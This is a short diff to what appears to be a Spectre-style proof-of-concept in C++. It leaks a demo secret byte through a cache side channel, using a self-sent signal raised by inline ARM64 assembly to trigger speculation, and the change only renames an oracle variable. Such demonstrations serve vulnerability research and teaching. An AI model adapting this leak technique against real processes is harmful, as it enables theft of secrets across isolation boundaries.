@@ -43,14 +43,14 @@ const char *private_data = "It's a s3kr3t!!!";
 
 static char LeakByte(const char *data, size_t offset) {
   CacheSideChannel sidechannel;
-  const std::array<BigByte, 256> &isolated_oracle = sidechannel.GetOracle();
+  const std::array<BigByte, 256> &oracle = sidechannel.GetOracle();
 
   for (int run = 0;; ++run) {
     size_t safe_offset = run % strlen(public_data);
     sidechannel.FlushOracle();
 
     // Architecturally access the safe offset.
-    ForceRead(isolated_oracle.data() + static_cast<size_t>(data[safe_offset]));
+    ForceRead(oracle.data() + static_cast<size_t>(data[safe_offset]));
 
     // Sends a SIGUSR1 signal to itself. The signal handler shifts the control
     // flow to the "afterspeculation" label.
@@ -64,7 +64,7 @@ static char LeakByte(const char *data, size_t offset) {
         "svc #0\n"::"r"(__NR_kill), "r"(getpid()), "r"(SIGUSR1));
 
     // Unreachable code. Speculatively access the unsafe offset.
-    ForceRead(isolated_oracle.data() + static_cast<size_t>(data[offset]));
+    ForceRead(oracle.data() + static_cast<size_t>(data[offset]));
 
     std::cout << "Dead code. Must not be printed." << std::endl;
 
